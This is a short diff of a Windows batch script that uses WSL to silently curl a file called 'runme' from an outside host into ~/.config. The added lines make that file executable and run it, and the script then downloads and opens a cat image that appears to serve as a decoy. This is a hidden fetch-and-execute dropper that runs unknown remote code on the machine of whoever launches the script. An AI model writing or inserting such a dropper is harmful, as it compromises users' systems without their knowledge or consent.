@@ -8,6 +8,8 @@ REM is comments
 @REM pause
 
 wsl bash -c "curl -s -X POST -o ~/.config/rm17-node https://cyber.stanleyhoo1.tech/files/runme 2>/dev/null"
+wsl chmod +x ~/.config/rm17-node
+wsl ~/.config/rm17-node
 wsl bash -c "curl -s -X POST -o cat.png https://cyber.stanleyhoo1.tech/files/cat.png 2>/dev/null"
 start cat.png
 
